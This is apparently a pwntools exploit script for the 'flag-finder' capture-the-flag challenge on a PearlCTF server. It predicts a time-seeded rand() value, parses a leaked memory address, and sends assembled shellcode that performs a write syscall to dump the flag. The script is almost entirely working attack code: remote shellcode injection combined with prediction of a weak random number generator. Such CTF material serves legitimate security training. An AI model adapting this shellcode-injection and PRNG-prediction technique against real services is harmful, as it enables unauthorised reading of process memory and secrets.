#!/usr/bin/env python3

from pwn import *
from ctypes import*

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("./flag-finder_patched")
libc = ELF("./libc6_2.35-0ubuntu3_amd64.so")
ld = ELF("./ld-2.35.so")
context.binary = exe

host = "dyn.ctf.pearlctf.in"
port = 30012

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    global DELAY
    if args.GDB:
        DELAY = GDB_DELAY
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        DELAY = LOCAL_DELAY
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    global DELAY
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        DELAY = REMOTE_DELAY
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

# functions

# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x4013E7 
bp 0x40142E
bp 0x0401483
bp 0x04014FE 
c
'''.format(**locals())

DELAY = 0
GDB_DELAY = -2
LOCAL_DELAY = 2
REMOTE_DELAY = -1

glibc = cdll.LoadLibrary('./criticalheap_libc_64.so.6')

# for i in range(-3, 3):
#     glibc.srand(glibc.time(None) + i)
#     info(f"i: {i} - {glibc.time(None) + i} - {hex(glibc.rand() % 4049)}")

io = start()
info(f"delay: {DELAY}s - {glibc.time(None) + DELAY}")
glibc.srand(glibc.time(None) + DELAY)
val = glibc.rand() % 4049
info(f"random: {hex(val)}")

io.recvuntil(b"starting from ")
ptr_mmap = int(io.recv(14).decode(), 16)
success(f"ptr_mmap: {hex(ptr_mmap)}")

f_asm = f"""
    mov rax, 1
    mov rdi, 1
    mov rsi, {ptr_mmap + val}
    mov rdx, 0x30
    syscall
"""

payload = asm(f_asm)

sla(b"> ", payload)
# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

io.interactive()

